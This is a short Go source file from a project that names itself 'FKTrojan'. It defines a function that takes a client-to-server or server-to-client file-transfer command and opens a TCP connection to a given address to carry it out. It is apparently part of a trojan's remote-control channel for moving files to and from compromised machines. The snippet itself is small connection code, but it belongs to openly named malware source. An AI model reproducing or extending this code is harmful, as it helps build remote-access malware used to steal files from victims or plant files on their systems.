package service_transfer

import (
	"FKTrojan/connect"
	"FKTrojan/dao"
	. "FKTrojan/flog"
	"fmt"
	"io"
)

// 客户端主动发起的传输
func TransFile(ip string, port int, cmd *dao.Command) error {

	if cmd.Code != dao.CMD_TRANS_C_TO_S &&
		cmd.Code != dao.CMD_TRANS_S_TO_C {
		return fmt.Errorf("cmd %s is not a trans file cmd", cmd.String())
	}
	client := connect.NewTcpClient(ip, port, func(r io.Reader, w io.Writer) error {
		return ClientHandler(r, w, cmd)
	})
	err := client.Run()
	if err != nil {
		Flog.Printf("client error %v\n", err)
	}
	return err
}
